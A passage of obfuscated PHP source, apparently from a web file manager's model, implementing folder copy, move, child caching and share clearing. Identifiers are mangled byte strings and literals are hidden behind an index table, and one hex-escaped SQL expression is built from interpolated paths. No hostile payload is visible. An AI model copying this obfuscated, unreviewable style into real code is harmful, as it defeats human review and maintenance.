($è«ø÷… == REPEAT_REPLACE) { $ü›Á—º = $this->sourceInfoCache($º“˜™›ø); $ÌËÖ¿× = $this->fileHistory($ü›Á—º, $¨ïšÅûò[$ÛÍ¶°•İ[477]], $¨ïšÅûò[$ÛÍ¶°•İ[86]]); if ($ÌËÖ¿×) { $îÉˆ¶Ù[$ÛÍ¶°•İ[575]][] = $¨ïšÅûò[$ÛÍ¶°•İ[477]]; } } else { if ($è«ø÷… == REPEAT_SKIP) { } } } Hook::trigger($ÛÍ¶°•İ[580], array($ÛÍ¶°•İ[581], $¨ïšÅûò, 0)); } return $¼×ÇÅ–²; } private function _copyCreate($Î˜Ïƒ™š, $üüˆòğÖ, $™­ùíÍ–, &$æ‹©¯€) { $©ÂŠÀ„„ =& $_SERVER[¹Û¹Æ€]; $Å£’†Š€ = $this->sourceInfoCache($Î˜Ïƒ™š); $³†ú‰Òø = $this->sourceInfoCache($üüˆòğÖ); $ÏôÈú„µ = $this->_makeItemData($Å£’†Š€, $³†ú‰Òø, $™­ùíÍ–); Hook::trigger($©ÂŠÀ„„[582], $ÏôÈú„µ); Hook::trigger($©ÂŠÀ„„[583], array($©ÂŠÀ„„[584], $ÏôÈú„µ, 0)); $ı°©ÚÀî = $this->add($ÏôÈú„µ); $¢èÀÓÜÅ = array($©ÂŠÀ„„[411] => $ı°©ÚÀî, $©ÂŠÀ„„[42] => $™­ùíÍ–); $this->_copyApplyMeta($¢èÀÓÜÅ, $æ‹©¯€); if ($Å£’†Š€[$©ÂŠÀ„„[419]] != $©ÂŠÀ„„[98]) { $æ‹©¯€[$©ÂŠÀ„„[575]][] = $Å£’†Š€[$©ÂŠÀ„„[477]]; return $ı°©ÚÀî; } $æ±Ì‚»Ğ = array(); $Ç‚ó µ = array(); $this->_childrenListAll($Î˜Ïƒ™š, $æ±Ì‚»Ğ); $ìîÉ„ÕŠ = count($æ±Ì‚»Ğ); if ($ìîÉ„ÕŠ == 0) { return $ı°©ÚÀî; } $÷ÓÂÏ­õ = $this->sourceInfo($ı°©ÚÀî); foreach ($æ±Ì‚»Ğ as $¨ıÕŞóƒ) { $±È‚¹×É = $this->_makeItemData($¨ıÕŞóƒ, $÷ÓÂÏ­õ, $¨ıÕŞóƒ[$©ÂŠÀ„„[42]]); $±È‚¹×É[$©ÂŠÀ„„[530]] = $¨ıÕŞóƒ[$©ÂŠÀ„„[530]]; $Ç‚ó µ[] = $±È‚¹×É; } $this->chunkEventSet($©ÂŠÀ„„[585], array($©ÂŠÀ„„[586], $ÏôÈú„µ, $ìîÉ„ÕŠ)); $this->addAll($Ç‚ó µ, array(), !1); $·¾˜şÙÜ = $this->where(array($©ÂŠÀ„„[441] => $ı°©ÚÀî))->select(); $ËäÕÁº¼ = $this->_childrenMakeRelation($æ±Ì‚»Ğ, $·¾˜şÙÜ); $ËäÕÁº¼[$Î˜Ïƒ™š] = $ı°©ÚÀî; $Ş­›Ñ¶£ = array(); $Ş£ŸÁˆ = array(); foreach ($·¾˜şÙÜ as $¨ıÕŞóƒ) { $üÊç¾ı = $¨ıÕŞóƒ[$©ÂŠÀ„„[411]]; $É£ü€Ëó = $this->_childrenMatch($ËäÕÁº¼, $¨ıÕŞóƒ, $÷ÓÂÏ­õ); $Ş­›Ñ¶£[] = array($©ÂŠÀ„„[411], $üÊç¾ı, $©ÂŠÀ„„[441], $É£ü€Ëó[$©ÂŠÀ„„[441]]); $Ş£ŸÁˆ[] = array($©ÂŠÀ„„[411], $üÊç¾ı, $©ÂŠÀ„„[530], $É£ü€Ëó[$©ÂŠÀ„„[530]]); $this->_copyApplyMeta($¨ıÕŞóƒ, $æ‹©¯€); if ($¨ıÕŞóƒ[$©ÂŠÀ„„[419]] != $©ÂŠÀ„„[98]) { $æ‹©¯€[$©ÂŠÀ„„[575]][] = $¨ıÕŞóƒ[$©ÂŠÀ„„[477]]; } } $this->chunkEventSet($©ÂŠÀ„„[587], array($©ÂŠÀ„„[588], $ÏôÈú„µ, $ìîÉ„ÕŠ)); $this->saveAll($Ş­›Ñ¶£); $this->chunkEventSet($©ÂŠÀ„„[589], array($©ÂŠÀ„„[590], $ÏôÈú„µ, $ìîÉ„ÕŠ)); $this->saveAll($Ş£ŸÁˆ); return $ı°©ÚÀî; } private function _childrenMakeRelation($èÓÎ‹ãÄ, $£ÉÌ”‰) { $› ÅÎŸÒ =& $_SERVER[¹Û¹Æ€]; $µÁ‡Â€è = array(); $·šï¡Ü¶ = array(); foreach ($èÓÎ‹ãÄ as $ı£•Øûâ) { $úñ´ÜÁŸ = $ı£•Øûâ[$› ÅÎŸÒ[42]] . $› ÅÎŸÒ[18] . $ı£•Øûâ[$› ÅÎŸÒ[530]]; $µÁ‡Â€è[$úñ´ÜÁŸ] = $ı£•Øûâ[$› ÅÎŸÒ[411]]; } foreach ($£ÉÌ”‰ as $ı£•Øûâ) { $úñ´ÜÁŸ = $ı£•Øûâ[$› ÅÎŸÒ[42]] . $› ÅÎŸÒ[18] . $ı£•Øûâ[$› ÅÎŸÒ[530]]; $‰óÃÃ½ä = $µÁ‡Â€è[$úñ´ÜÁŸ]; $·šï¡Ü¶[$‰óÃÃ½ä] = $ı£•Øûâ[$› ÅÎŸÒ[411]]; } return $·šï¡Ü¶; } private function _childrenMatch($ŞÇÜãåê, $Ú‘µ™ñò, $«¤”ÈÒ©) { $Î¸Ûàû‚ =& $_SERVER[¹Û¹Æ€]; $Ó…áÅ† = $«¤”ÈÒ©[$Î¸Ûàû‚[530]]; $šæ¼Õæ = $this->parentLevelArray($Ú‘µ™ñò[$Î¸Ûàû‚[530]]); foreach ($šæ¼Õæ as $›ù¦™ãÈ) { if (isset($ŞÇÜãåê[$›ù¦™ãÈ])) { $Ó…áÅ† .= $ŞÇÜãåê[$›ù¦™ãÈ] . $Î¸Ûàû‚[591]; } } $Ó…áÅ† = rtrim($Ó…áÅ†, $Î¸Ûàû‚[60]) . $Î¸Ûàû‚[60]; $Şæ˜·š¨ = $this->parentLevelArray($Ó…áÅ†); $³¸»¶«® = $Şæ˜·š¨[count($Şæ˜·š¨) - 1]; return array($Î¸Ûàû‚[441] => $³¸»¶«®, $Î¸Ûàû‚[530] => $Ó…áÅ†); } private function _makeItemData($›¹“İÙ, $àœş½®ı, $·äÏÜíÓ) { $ø«âİ¼ô =& $_SERVER[¹Û¹Æ€]; $†ˆò¥® = array($ø«âİ¼ô[592] => $›¹“İÙ[$ø«âİ¼ô[419]], $ø«âİ¼ô[429] => $·äÏÜíÓ, $ø«âİ¼ô[593] => $›¹“İÙ[$ø«âİ¼ô[421]] ? $›¹“İÙ[$ø«âİ¼ô[421]] : $ø«âİ¼ô[22], $ø«âİ¼ô[478] => $›¹“İÙ[$ø«âİ¼ô[477]] ? $›¹“İÙ[$ø«âİ¼ô[477]] : 0, $ø«âİ¼ô[594] => $›¹“İÙ[$ø«âİ¼ô[86]] ? $›¹“İÙ[$ø«âİ¼ô[86]] : 0, $ø«âİ¼ô[595] => intval($àœş½®ı[$ø«âİ¼ô[420]]), $ø«âİ¼ô[596] => intval($àœş½®ı[$ø«âİ¼ô[514]]), $ø«âİ¼ô[597] => intval(USER_ID), $ø«âİ¼ô[598] => intval(USER_ID), $ø«âİ¼ô[410] => intval($àœş½®ı[$ø«âİ¼ô[411]]), $ø«âİ¼ô[599] => $àœş½®ı[$ø«âİ¼ô[530]] . $àœş½®ı[$ø«âİ¼ô[411]] . $ø«âİ¼ô[60], $ø«âİ¼ô[433] => $›¹“İÙ[$ø«âİ¼ô[95]] ? $›¹“İÙ[$ø«âİ¼ô[95]] : time(), $ø«âİ¼ô[439] => 0, $ø«âİ¼ô[600] => $ø«âİ¼ô[22]); return $†ˆò¥®; } private function _copyApplyMeta($Ø‚º¯°é, &$¥·€ì·Í) { $¾ù„Èº— =& $_SERVER[¹Û¹Æ€]; $°ñ×àÕ¼ = $Ø‚º¯°é[$¾ù„Èº—[411]]; $ÆèúïÌ = $Ø‚º¯°é[$¾ù„Èº—[42]]; if (!isset($Ø‚º¯°é[$¾ù„Èº—[601]]) || !$Ø‚º¯°é[$¾ù„Èº—[601]] || $Ø‚º¯°é[$¾ù„Èº—[601]] == $¾ù„Èº—[207]) { $¥·€ì·Í[$¾ù„Èº—[577]][] = array($¾ù„Èº—[411], $°ñ×àÕ¼, $¾ù„Èº—[601], short_id($°ñ×àÕ¼)); } if (Input::check($ÆèúïÌ, $¾ù„Èº—[602])) { $¥·€ì·Í[$¾ù„Èº—[576]][] = array($¾ù„Èº—[411] => $°ñ×àÕ¼, $¾ù„Èº—[104] => $¾ù„Èº—[474], $¾ù„Èº—[383] => str_replace($¾ù„Èº—[63], $¾ù„Èº—[22], Pinyin::get($ÆèúïÌ))); $¥·€ì·Í[$¾ù„Èº—[576]][] = array($¾ù„Èº—[411] => $°ñ×àÕ¼, $¾ù„Èº—[104] => $¾ù„Èº—[473], $¾ù„Èº—[383] => Pinyin::get($ÆèúïÌ, $¾ù„Èº—[603])); } $¥·€ì·Í[$¾ù„Èº—[576]][] = array($¾ù„Èº—[411] => $°ñ×àÕ¼, $¾ù„Èº—[104] => $¾ù„Èº—[453], $¾ù„Èº—[383] => KodSort::makeStr($ÆèúïÌ)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($ßÃÜÖ¥ù) { $Š•çãÜ =& $_SERVER[¹Û¹Æ€]; $ôáÖÃõ˜ = $this->sourceInfo($ßÃÜÖ¥ù); $•¯•¥±À = $Š•çãÜ[604]; $†ï×ĞŒÀ = array($Š•çãÜ[530] => array($Š•çãÜ[559], $ôáÖÃõ˜[$Š•çãÜ[530]] . $ßÃÜÖ¥ù . $Š•çãÜ[560]), $Š•çãÜ[440] => $this->targetIsDelete); $ŒŒ÷±Ëˆ = $this->field($•¯•¥±À)->where($†ï×ĞŒÀ)->select(); if (!$ŒŒ÷±Ëˆ) { return; } $ŒŒ÷±Ëˆ = array_to_keyvalue($ŒŒ÷±Ëˆ, $Š•çãÜ[411]); foreach ($ŒŒ÷±Ëˆ as $èÇ‚ÆÏî) { $¤ôİÜ‘ı = $èÇ‚ÆÏî[$Š•çãÜ[441]]; $ßÃÜÖ¥ù = $èÇ‚ÆÏî[$Š•çãÜ[411]]; if (!isset($this->_childrenListCache[$ßÃÜÖ¥ù]) && $èÇ‚ÆÏî[$Š•çãÜ[419]] == $Š•çãÜ[98]) { $this->_childrenListCache[$ßÃÜÖ¥ù] = array(); } if (!isset($this->_childrenListCache[$¤ôİÜ‘ı])) { $this->_childrenListCache[$¤ôİÜ‘ı] = array(); } $this->_childrenListCache[$¤ôİÜ‘ı][$ßÃÜÖ¥ù] = $èÇ‚ÆÏî; $this->_childrenItemCache[$ßÃÜÖ¥ù] = $èÇ‚ÆÏî; } } private function _childrenListAll($åº”¡öù, &$ã¦¥†Çô) { $å‹§ãü =& $_SERVER[¹Û¹Æ€]; if (!isset($this->_childrenListCache[$åº”¡öù])) { return; } $í¦œğØÀ = $this->_childrenListCache[$åº”¡öù]; foreach ($í¦œğØÀ as $ü®™ªŒ => $Í¸Ø‚Î) { $ã¦¥†Çô[$ü®™ªŒ] = $Í¸Ø‚Î; if ($Í¸Ø‚Î[$å‹§ãü[419]] == $å‹§ãü[98]) { $this->_childrenListAll($ü®™ªŒ, $ã¦¥†Çô); } } } private function sourceInfoCache($ü¶»¯¨ï) { if (isset($this->_childrenItemCache[$ü¶»¯¨ï])) { return $this->_childrenItemCache[$ü¶»¯¨ï]; } return $this->sourceInfo($ü¶»¯¨ï); } private function _childrenList($ ¿è³Ä¾) { if (isset($this->_childrenListCache[$ ¿è³Ä¾])) { return $this->_childrenListCache[$ ¿è³Ä¾]; } return $this->_childrenListSelect($ ¿è³Ä¾); } private function _childrenListSelect($¶ãşÓ·è) { $à´…Œƒé =& $_SERVER[¹Û¹Æ€]; $ßŠÎïÓ« = array($à´…Œƒé[441] => $¶ãşÓ·è, $à´…Œƒé[440] => $this->targetIsDelete); $‹–³ôÍ¤ = $this->where($ßŠÎïÓ«)->select(); $‹–³ôÍ¤ = $‹–³ôÍ¤ ? $‹–³ôÍ¤ : array(); $²´şŞ¶¦ = array_to_keyvalue($‹–³ôÍ¤, $à´…Œƒé[411]); $this->_childrenListCache[$¶ãşÓ·è] = $²´şŞ¶¦; foreach ($²´şŞ¶¦ as $¶ãşÓ·è => $†ì¡âì¦) { $this->_childrenItemCache[$¶ãşÓ·è] = $†ì¡âì¦; } return $²´şŞ¶¦; } private function fileNameExistCache($Ò‹³Í‹, $¡œ·üÂ·) { $’‘œ«Ç =& $_SERVER[¹Û¹Æ€]; $¡œ·üÂ· = strtolower($¡œ·üÂ·); $…½Ö”¬È = $this->_childrenList($Ò‹³Í‹); foreach ($…½Ö”¬È as $Û¥ËŠÀ¡) { if ($¡œ·üÂ· == strtolower($Û¥ËŠÀ¡[$’‘œ«Ç[42]])) { return $Û¥ËŠÀ¡[$’‘œ«Ç[411]]; } } return !1; } private function fileNameAutoCache($»ã¡“ØÊ, $æñÇ¥®, $Õ´À§èÌ, $ ²ü²Œá) { $…Ğ¹šÅØ =& $_SERVER[¹Û¹Æ€]; $ğªÊ´Â = $this->_childrenList($»ã¡“ØÊ); $‰¤Š•Ìë = array_to_keyvalue($ğªÊ´Â, $…Ğ¹šÅØ[22], $…Ğ¹šÅØ[42]); return $this->fileNameAutoGet($‰¤Š•Ìë, $æñÇ¥®, $Õ´À§èÌ, $ ²ü²Œá); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($Ã¯Î¦ûÍ, $‘í›§ŞÔ, $†ÄÎ˜Û™ = REPEAT_REPLACE, $Í¸ãº¦ = '') { $ğ†éßŠá =& $_SERVER[¹Û¹Æ€]; $åÏ™’ñè = $this->sourceInfo($Ã¯Î¦ûÍ); $™ÄÜ¥›Ø = $this->sourceInfo($‘í›§ŞÔ); if ($åÏ™’ñè[$ğ†éßŠá[441]] == $™ÄÜ¥›Ø[$ğ†éßŠá[411]]) { if ($åÏ™’ñè[$ğ†éßŠá[440]] == $ğ†éßŠá[98]) { Model($ğ†éßŠá[438])->restore(array($Ã¯Î¦ûÍ)); } if (!$Í¸ãº¦ || $Í¸ãº¦ == $åÏ™’ñè[$ğ†éßŠá[42]]) { return $Ã¯Î¦ûÍ; } } $çî‘æ€ = $this->pathInfoMore($Ã¯Î¦ûÍ); if ($this->isParentOf($Ã¯Î¦ûÍ, $‘í›§ŞÔ)) { return !1; } if (!$åÏ™’ñè || !$™ÄÜ¥›Ø || $™ÄÜ¥›Ø[$ğ†éßŠá[419]] != $ğ†éßŠá[98]) { return !1; } Hook::trigger($ğ†éßŠá[605], $çî‘æ€); $this->targetIsDelete = intval($åÏ™’ñè[$ğ†éßŠá[440]]); if ($åÏ™’ñè[$ğ†éßŠá[441]] == $‘í›§ŞÔ && $Í¸ãº¦ != $åÏ™’ñè[$ğ†éßŠá[42]]) { $Ñç˜‘ü = $this->fileNameExist($‘í›§ŞÔ, $Í¸ãº¦); if ($Ñç˜‘ü && $åÏ™’ñè[$ğ†éßŠá[419]] == $ğ†éßŠá[207]) { $ãîú¥Ğ­ = $this->sourceInfo($Ñç˜‘ü); $˜”—î¶Â = $this->fileHistory($ãîú¥Ğ­, $åÏ™’ñè[$ğ†éßŠá[477]], $åÏ™’ñè[$ğ†éßŠá[86]]); if (!$˜”—î¶Â) { Model($ğ†éßŠá[480])->remove($åÏ™’ñè[$ğ†éßŠá[477]]); } $this->removeNow($Ã¯Î¦ûÍ, !1); $this->folderSizeReset($‘í›§ŞÔ); Hook::trigger($ğ†éßŠá[606], $çî‘æ€); return $Ñç˜‘ü; } } $å ®¦ç” = $Í¸ãº¦ ? $Í¸ãº¦ : $åÏ™’ñè[$ğ†éßŠá[42]]; $this->lockMoveStart($Ã¯Î¦ûÍ); $this->lockWriteStart($‘í›§ŞÔ, $å ®¦ç”); $Ø½»»£· = array($ğ†éßŠá[575] => array(), $ğ†éßŠá[607] => !1); $this->clearShare($Ã¯Î¦ûÍ, $‘í›§ŞÔ); $ä¥¶Á = $this->fileNameExistCache($‘í›§ŞÔ, $åÏ™’ñè[$ğ†éßŠá[42]]); $Öñ€ôË = $this->_move($Ã¯Î¦ûÍ, $‘í›§ŞÔ, $†ÄÎ˜Û™, $Ø½»»£·, $Í¸ãº¦); $this->sourceCacheClear(); if ($åÏ™’ñè[$ğ†éßŠá[419]] == $ğ†éßŠá[98] && $ä¥¶Á) { $this->folderSizeResetChildren($Öñ€ôË); } Model($ğ†éßŠá[209])->linkAdd($Ø½»»£·[$ğ†éßŠá[575]]); if ($ä¥¶Á && $Ø½»»£·[$ğ†éßŠá[607]]) { $this->removeNow($Ã¯Î¦ûÍ, !1); } $this->lockMoveEnd($Ã¯Î¦ûÍ); $this->lockWriteEnd($‘í›§ŞÔ, $å ®¦ç”); $this->folderSizeReset($åÏ™’ñè[$ğ†éßŠá[441]]); $this->folderSizeReset($‘í›§ŞÔ); $–ã¦éã‰ = array($åÏ™’ñè[$ğ†éßŠá[441]], $‘í›§ŞÔ); if ($åÏ™’ñè[$ğ†éßŠá[419]] == $ğ†éßŠá[98]) { $–ã¦éã‰[] = $Ã¯Î¦ûÍ; } $this->updateModifyTime($–ã¦éã‰); Model($ğ†éßŠá[579])->eventMove($Ã¯Î¦ûÍ, $åÏ™’ñè[$ğ†éßŠá[441]], $‘í›§ŞÔ); Hook::trigger($ğ†éßŠá[606], $çî‘æ€); return $Öñ€ôË; } private function _move($ÜÕÑ­€ë, $„Ñ³®†ú, $ƒ„Ÿ­‰‘, &$Ê‡”İ©„, $ĞÚØˆ‡® = '') { $Ã¤Ûñé =& $_SERVER[¹Û¹Æ€]; $ßóçêÔÊ = $this->sourceInfo($ÜÕÑ­€ë); $ÖŸˆî¹¾ = $ßóçêÔÊ[$Ã¤Ûñé[419]] == $Ã¤Ûñé[98]; $›×Æ¬ú¸ = $ĞÚØˆ‡® ? $ĞÚØˆ‡® : $ßóçêÔÊ[$Ã¤Ûñé[42]]; $âßºúóá = $this->fileNameExistCache($„Ñ³®†ú, $›×Æ¬ú¸); $this->lockMoveStart($ÜÕÑ­€ë); $this->lockWriteStart($„Ñ³®†ú, $›×Æ¬ú¸); if (!$âßºúóá) { return $this->_moveForce($ÜÕÑ­€ë, $„Ñ³®†ú, $›×Æ¬ú¸); } $òí®ûÄ‡ = $âßºúóá; $ì£åö‘Ğ = !1; if ($ÖŸˆî¹¾) { if ($ƒ„Ÿ­‰‘ == REPEAT_RENAME_FOLDER) { $›×Æ¬ú¸ = $this->fileNameAuto($„Ñ³®†ú, $›×Æ¬ú¸, $ƒ„Ÿ­‰‘, $ÖŸˆî¹¾); $òí®ûÄ‡ = $this->_moveForce($ÜÕÑ­€ë, $„Ñ³®†ú, $›×Æ¬ú¸); } else { if ($ƒ„Ÿ­‰‘ == REPEAT_RENAME_FOLDER) { $ƒ„Ÿ­‰‘ = REPEAT_RENAME; } $­ó­ÜÆ· = $this->_childrenListSelect($ÜÕÑ­€ë); foreach ($­ó­ÜÆ· as $±¤¯ù®Ë) { $this->_move($±¤¯ù®Ë[$Ã¤Ûñé[411]], $âßºúóá, $ƒ„Ÿ­‰‘, $Ê‡”İ©„); } $ì£åö‘Ğ = !0; } } else { if ($ƒ„Ÿ­‰‘ == REPEAT_SKIP) { $ì£åö‘Ğ = !0; } else { if ($ƒ„Ÿ­‰‘ == REPEAT_RENAME || $ƒ„Ÿ­‰‘ == REPEAT_RENAME_FOLDER) { $›×Æ¬ú¸ = $this->fileNameAuto($„Ñ³®†ú, $›×Æ¬ú¸, $ƒ„Ÿ­‰‘, $ÖŸˆî¹¾); $òí®ûÄ‡ = $this->_moveForce($ÜÕÑ­€ë, $„Ñ³®†ú, $›×Æ¬ú¸); } else { if ($ƒ„Ÿ­‰‘ == REPEAT_REPLACE) { $æÉä‹‹Ù = $this->sourceInfoCache($âßºúóá); $¤Ï–ÁÃ¹ = $this->fileHistory($æÉä‹‹Ù, $ßóçêÔÊ[$Ã¤Ûñé[477]], $ßóçêÔÊ[$Ã¤Ûñé[86]]); $ì£åö‘Ğ = !0; if ($¤Ï–ÁÃ¹) { $Ê‡”İ©„[$Ã¤Ûñé[575]][] = $ßóçêÔÊ[$Ã¤Ûñé[477]]; } } } } } if ($ì£åö‘Ğ && !$Ê‡”İ©„[$Ã¤Ûñé[607]]) { $Ê‡”İ©„[$Ã¤Ûñé[607]] = !0; } return $òí®ûÄ‡; } private function _moveForce($Îƒİ€ˆ, $èĞ¡¤Š, $…‹¶Ôâ¶) { $‘¦Şª ı =& $_SERVER[¹Û¹Æ€]; $Ø·Ê€Í = $this->sourceInfo($Îƒİ€ˆ); $Ûó­üÖ‘ = $this->sourceInfo($èĞ¡¤Š); $×‚¢ó—´ = $Ø·Ê€Í[$‘¦Şª ı[419]] == $‘¦Şª ı[98]; $çÊ©¡ = array($‘¦Şª ı[410] => $Ûó­üÖ‘[$‘¦Şª ı[411]], $‘¦Şª ı[599] => $Ûó­üÖ‘[$‘¦Şª ı[530]] . $Ûó­üÖ‘[$‘¦Şª ı[411]] . $‘¦Şª ı[60], $‘¦Şª ı[595] => $Ûó­üÖ‘[$‘¦Şª ı[420]], $‘¦Şª ı[596] => $Ûó­üÖ‘[$‘¦Şª ı[514]], $‘¦Şª ı[598] => USER_ID, $‘¦Şª ı[429] => $…‹¶Ôâ¶); $š€Ä—¬­ = $Ø·Ê€Í[$‘¦Şª ı[420]] == SourceModel::TYPE_GROUP && $Ûó­üÖ‘[$‘¦Şª ı[420]] == SourceModel::TYPE_GROUP && $Ø·Ê€Í[$‘¦Şª ı[514]] == $Ûó­üÖ‘[$‘¦Şª ı[514]]; if (!$š€Ä—¬­ && $this->moveClearAuth) { Model($‘¦Şª ı[511])->authClear($Îƒİ€ˆ); } $é©Âúúä = $Ø·Ê€Í[$‘¦Şª ı[440]] == $‘¦Şª ı[98] && $Ûó­üÖ‘[$‘¦Şª ı[440]] != $‘¦Şª ı[98]; if ($é©Âúúä) { $çÊ©¡[$‘¦Şª ı[439]] = 0; } if ($×‚¢ó—´) { $ÓéÏ´¥ = array($‘¦Şª ı[599] => array($‘¦Şª ı[559], $Ø·Ê€Í[$‘¦Şª ı[530]] . $Ø·Ê€Í[$‘¦Şª ı[411]] . $‘¦Şª ı[560])); $÷Œø‹º = $Ø·Ê€Í[$‘¦Şª ı[530]] . $Ø·Ê€Í[$‘¦Şª ı[411]] . $‘¦Şª ı[60]; $×Òã˜‚¸ = $Ûó­üÖ‘[$‘¦Şª ı[530]] . $Ûó­üÖ‘[$‘¦Şª ı[411]] . $‘¦Şª ı[60] . $Ø·Ê€Í[$‘¦Şª ı[411]] . $‘¦Şª ı[60]; $Ç¶ôÜ«Ô = array($‘¦Şª ı[599] => array($‘¦Şª ı[608], "\x72\145\160\x6c\141\143\145\x28\x70\141\162\145\156\164\x4c\x65\166\x65\154\x2c\x27{$÷Œø‹º}\47\x2c\x27{$×Òã˜‚¸}\x27\x29"), $‘¦Şª ı[595] => $Ûó­üÖ‘[$‘¦Şª ı[420]], $‘¦Şª ı[596] => $Ûó­üÖ‘[$‘¦Şª ı[514]]); if ($é©Âúúä) { $Ç¶ôÜ«Ô[$‘¦Şª ı[439]] = 0; } $this->where($ÓéÏ´¥)->data($Ç¶ôÜ«Ô)->save(); } $this->where(array($‘¦Şª ı[426] => $Îƒİ€ˆ))->data($çÊ©¡)->save(); return $Îƒİ€ˆ; } private function clearShare($òğ•œÇš, $÷ì§öÆô) { $ßäØ£ñÆ =& $_SERVER[¹Û¹Æ€]; $‰œ¢ñ»Ò = $this->sourceInfo($òğ•œÇš); $ıÚÃ¬İÅ = $this->sourceInfo($÷ì§öÆô); if ($‰œ¢ñ»Ò[$ßäØ£ñÆ[514]] == $ıÚÃ¬İÅ[$ßäØ£ñÆ[514]] && $‰œ¢ñ»Ò[$ßäØ£ñÆ[420]] == $ßäØ£ñÆ[609]) { return; } $©œŒó× = array($ßäØ£ñÆ[530] => array($ßäØ£ñÆ[559], $‰œ¢ñ»Ò[$ßäØ£ñÆ[530]] . $òğ•œÇš . $ßäØ£ñÆ[560])); $¼·²Òà” = $this->field($ßäØ£ñÆ[426])->where($©œŒó×)->getField($ßäØ£ñÆ[411], !0); if (!$¼·²Òà”) { return; } $©œŒó× = array($ßäØ£ñÆ[411] => array($ßäØ£ñÆ[17], $¼·²Òà”), $ßäØ£ñÆ[505] => 1); $¦ô»»±ì = Model($ßäØ£ñÆ[610])->field($ßäØ£ñÆ[498])->where($©œŒó×)->select(); if (!$¦ô»»±ì) { return; } $¦ô»»±ì = array_to_keyvalue($¦ô»»±ì, $ßäØ£ñÆ[22], $ßäØ£ñÆ[498]); $©œŒó× = array($ßäØ£ñÆ[498] => array($ßäØ£ñÆ[17], $¦ô»»±ì)); Model($ßäØ£ñÆ[610])->where($©œŒó×)->save(array($ßäØ£ñÆ[505] => 0)); Model($ßäØ£ñÆ[611])->where($©œŒó×)->delete(); } public function copyFolderFromIO($€ëÂí²ğ, $±—¦Áé, $Ğ¶›Ìãï, $ŞÂÂ×Êö, $îšùì†á, $Õ”¦—ŸÔ = false) { $œñŞ¢¯ =& $_SERVER[¹Û¹Æ€]; $ÚÎâ’Ãˆ = array($œñŞ¢¯[576] => array(), $œñŞ¢¯[577] => array(), $œñŞ¢¯[575] => array(), $œñŞ¢¯[612] => array()); $£”ôÎˆŠ = $Õ”¦—ŸÔ ? $Õ”¦—ŸÔ : $€ëÂí²ğ->pathThis($±—¦Áé); $ƒµƒ²ÃÕ = $this->fileNameExist($Ğ¶›Ìãï, $£”ôÎˆŠ); $¬Ø…¯Ä» = $this->mkdir($Ğ¶›Ìãï, $£”ôÎˆŠ, $ŞÂÂ×Êö); if (!$ƒµƒ²ÃÕ || $ŞÂÂ×Êö == REPEAT_RENAME_FOLDER) { $ŞÂÂ×Êö = !1; } if ($ƒµƒ²ÃÕ) { $this->_childrenAllMake($ƒµƒ²ÃÕ); } Hook::trigger($œñŞ¢¯[613]); $this->_copyChildTo($€ëÂí²ğ, $±—¦Áé, $¬Ø…¯Ä», $ŞÂÂ×Êö, $ÚÎâ’Ãˆ, $îšùì†á); Hook::trigger($œñŞ¢¯[614]); if ($¬Ø…¯Ä») { $this->folderSizeResetChildren($¬Ø…¯Ä»); } $this->_childrenListClear(); Model($œñŞ¢¯[578])->addAll($ÚÎâ’Ãˆ[$œñŞ¢¯[576]], array(), !0); Model($œñŞ¢¯[579])->eventCopy($¬Ø…¯Ä»); $this->saveAll($ÚÎâ’Ãˆ[$œñŞ¢¯[577]]); Model($œñŞ¢¯[480])->linkAdd($ÚÎâ’Ãˆ[$œñŞ¢¯[575]]); Model($œñŞ¢¯[480])->remove($ÚÎâ’Ãˆ[$œñŞ¢¯[612]]); $this->folderSizeReset($Ğ¶›Ìãï); $this->updateModifyTime($Ğ¶›Ìãï); return $¬Ø…¯Ä»; } private function _copyChildTo($¢—º‚¸Ù, $§–­Ô”, $ëñõ âî, $À¨¾ªš, &$²ˆàÉÌ, $âšƒÚò•) { $úëí»Üí =& $_SERVER[¹Û¹Æ€]; $…ºÈµŸı = $this->sourceInfoCache($ëñõ âî); $‹Ù¨Õ = $¢—º‚¸Ù->listPath($§–­Ô”); $‹Ù¨Õ = $‹Ù¨Õ ? $‹Ù¨Õ : array($úëí»Üí[93] => array(), $úëí»Üí[92] => array()); $“Öß©ô… = array_merge($‹Ù¨Õ[$úëí»Üí[93]], $‹Ù¨Õ[$úëí»Üí[92]]); $ùË›å¨µ = $this->_addFiles($¢—º‚¸Ù, $‹Ù¨Õ[$úëí»Üí[93]], $âšƒÚò•); $ƒ…£Â©ç = array(); foreach ($“Öß©ô… as &$øÃÁÇ•) { if (isset($ùË›å¨µ[$øÃÁÇ•[$úëí»Üí[42]]])) { $øÃÁÇ• = $ùË›å¨µ[$øÃÁÇ•[$úëí»Üí[42]]]; } $øÃÁÇ•[$úëí»Üí[419]] = $øÃÁÇ•[$úëí»Üí[43]] == $úëí»Üí[85]; $øÃÁÇ•[$úëí»Üí[421]] = substr(_get($øÃÁÇ•, $úëí»Üí[184], $úëí»Üí[22]), 0, 10); $øÃÁÇ•[$úëí»Üí[86]] = _get($øÃÁÇ•, $úëí»Üí[86], 0); $øÃÁÇ•[$úëí»Üí[477]] = _get($øÃÁÇ•, $úëí»Üí[477], 0); if (!isset($øÃÁÇ•[$úëí»Üí[615]]) && $øÃÁÇ•[$úëí»Üí[477]]) { $²ˆàÉÌ[$úëí»Üí[612]][] = $øÃÁÇ•[$úëí»Üí[477]]; } if ($À¨¾ªš) { $È»ÉŸ³° = $this->fileNameExistCache($ëñõ âî, $øÃÁÇ•[$úëí»Üí[42]]); if ($È»ÉŸ³°) { if ($øÃÁÇ•[$úëí»Üí[419]] || $À¨¾ªš == REPEAT_SKIP) { continue; } if ($À¨¾ªš == REPEAT_REPLACE) { $óªó¾À‹ = $this->sourceInfoCache($È»ÉŸ³°); $§ò¢¢’Ñ = $this->fileHistory($óªó¾À‹, $øÃÁÇ•[$úëí»Üí[477]], $øÃÁÇ•[$úëí»Üí[86]]); if ($§ò¢¢’Ñ) { $²ˆàÉÌ[$úëí»Üí[575]][] = $øÃÁÇ•[$úëí»Üí[477]]; } continue; } else { if ($À¨¾ªš == REPEAT_RENAME) { $øÃÁÇ•[$úëí»Üí[42]] = $this->fileNameAutoCache($ëñõ âî, $øÃÁÇ•[$úëí»Üí[42]], $À¨¾ªš, !1); } } } } if (!$øÃÁÇ•[$úëí»Üí[419]] && $øÃÁÇ•[$úëí»Üí[477]] == 0) { continue; } if (!$øÃÁÇ•[$úëí»Üí[419]] && 